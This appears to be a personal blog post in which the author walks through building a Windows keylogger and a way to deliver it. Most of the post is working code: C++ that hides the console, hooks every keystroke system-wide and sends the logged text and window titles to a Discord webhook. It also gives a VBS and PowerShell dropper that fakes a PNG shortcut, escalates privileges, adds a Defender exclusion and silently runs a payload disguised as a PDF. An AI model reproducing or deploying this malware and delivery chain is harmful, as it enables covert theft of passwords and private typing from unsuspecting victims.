So I made a keylogger

After spending days looking at terrible EXE files made by script kiddies, I figured, “I can make one too—just less trash.”
And now it exists: a Windows keylogger that hides in the background, quietly collects keystrokes, and sends everything to a Discord webhook like late-night secrets.

All of this, by the way, is for educational purposes. Do not be a dumbass.

## The Anatomy of a Keylogger

### 1. Go Ghost or Go Home

```cpp
// Hide console window
void Stealth() {
#ifdef invisible
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
        FreeConsole();
    }
#endif
}

// Single instance check
hMutex = CreateMutexW(NULL, TRUE, L"Global\\MyKeyloggerMutex");
if (GetLastError() == ERROR_ALREADY_EXISTS) {
    if (hMutex) CloseHandle(hMutex);
    return 0;
}
```
{: .nolineno }

Hide the console. Check if there's already a clone of this malware running. If so, exit quietly

---

### 2. Keyboard Hook Setup

```cpp
// Keyboard hook callback
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        Save(kbdStruct->vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
}
```
{: .nolineno }

We jam a hook straight into WH_KEYBOARD_LL. This means every key, across the OS, goes through us. That’s right, whether you’re writing an email or confessing to murder in Notepad, I see it all.

### 3. Key Processing and Special Characters

```cpp
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    // ... other special keys ...
};

int Save(int key_stroke) {
    std::string keystr;
    if (keyname.find(key_stroke) != keyname.end()) {
        keystr = keyname.at(key_stroke);
    } else {
        char key = MapVirtualKeyA(key_stroke, MAPVK_VK_TO_CHAR);
        if (key > 0) {
            keystr = std::string(1, key);
        }
    }
    // Append to buffer...
}
```
{: .nolineno }

You need to process it before storing. Special characters get converted. Everything else gets flushed into the buffer

### 4. Data Exfiltration to Discord

```cpp
bool SendToDiscord(const std::string& window_title, const std::string& keystrokes) {
    std::string json =
    "{"
    "   \"embeds\": [{"
    "       \"title\": \"Keystroke Capture\","
    "       \"color\": 16711680,"
    "       \"fields\": ["
    "           { \"name\": \"Active Window\", \"value\": \"" + EscapeJson(window_title) + "\", \"inline\": false },"
    "           { \"name\": \"Character Count\", \"value\": \"" + std::to_string(keystrokes.size()) + "\", \"inline\": true },"
    "           { \"name\": \"Logged Data\", \"value\": \"```" + EscapeJson(keystrokes) + "```\", \"inline\": false }"
    "       ],"
    "       \"timestamp\": \"" + GetISO8601Time() + "\""
    "   }]"
    "}";
    // HTTP POST via WinHTTP
}
```
{: .nolineno }

Look, spinning up a whole command-and-control server is effort, and I already wasted enough braincells. Discord webhooks? Easy. Fast. Fancy JSON. Stealthy as hell (unless you just dump the webhook link as a whole). Just make sure not to hit rate limits or maybe you enjoy watching logs disappear into the void.

### 5. Threading and Buffering

```cpp
std::string buffer;
std::mutex buffer_mutex;

void DiscordSender() {
    while (running) {
        Sleep(SEND_INTERVAL * 1000);
        
        std::string copy_keystrokes;
        std::string copy_window_title;
        {
            std::lock_guard<std::mutex> lock(buffer_mutex);
            if (buffer.empty()) continue;
            
            copy_keystrokes = buffer;
            copy_window_title = buffer_window_title;
            buffer.clear();
        }
        SendToDiscord(copy_window_title, copy_keystrokes);
    }
}
```
{: .nolineno }

Thread A logs your filthy typing habits. Thread B dumps it to Discord every few seconds.

## Social Engineering: Delivery Mechanism

To get someone to run the payload, I went with a classic folder-trap bait setup. Here’s the structure:

```
📁 main_folder/
├── crypto.png.lnk         <- shortcut disguised as an image
└── .nobu/                 <- hidden folder
    ├── fakenobu.pdf
    ├── realnobu.pdf
    ├── batnobu.ps1
    └── vbsnobu.vbs
```

The `.nobu/` folder is hidden. `crypto.png.lnk` points to the VBS, which runs the PowerShell script, which renames and executes the payload silently.

### batnobu.ps1

```powershell
$ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Definition

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$realNobuPdf = Join-Path $ScriptPath "realnobu.pdf"
$realNobuExe = Join-Path $ScriptPath "realnobu.exe"

attrib -r -h -s $realNobuPdf
Rename-Item -Path $realNobuPdf -NewName "realnobu.exe" -Force

Add-MpPreference -ExclusionPath $realNobuExe

Start-Process "$ScriptPath\fakenobu.pdf"
Start-Process -FilePath $realNobuExe -WindowStyle Hidden
```

It asks for admin, renames the payload, adds it to Defender exclusions, opens the decoy, and runs the payload hidden.

### vbsnobu.vbs

```shell
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""batnobu.ps1""", 0, False
```

Silent execution without a visible terminal. Does exactly what you think it does.

### crypto.png.lnk

Shortcut pointing to `vbsnobu.vbs`, icon changed to a PNG, name set to `crypto.png`. Clicking it feels harmless. It’s not.

---

## Takeaways

This experiment combined code and trickery. Turns out social engineering is way more powerful than just raw exploit code.

- Code is nothing without delivery
- Humans are easier to exploit than machines
- Defender exclusions are a joke
- Icon swapping + extension spoofing = free access
- Sometimes just renaming `.exe` to `.pdf` is enough


There also alot of other social engineer method like using dll, Left-to-Right override (dont think it still work), change icon directly in the exe (resouce hacker is free btw) and other yet to be explored. Social engineering is a dark art. And once you realize how easy it is to fool a human, it kinda ruins everything. And also makes you want to reformat your entire brain. But hey, at least it was educational.

## Sum up

This project made me realize something horrible and beautiful: malware is easy. Terrifyingly easy (at least the simple stuff).  
A few lines of C++, a bit of WinAPI black magic, and you've got a fully operational surveillance drone.  
The hardest part? Tricking people into clicking it.

So... maybe trust less. Click less.  
And always check your Task Manager for that one weird mutex.
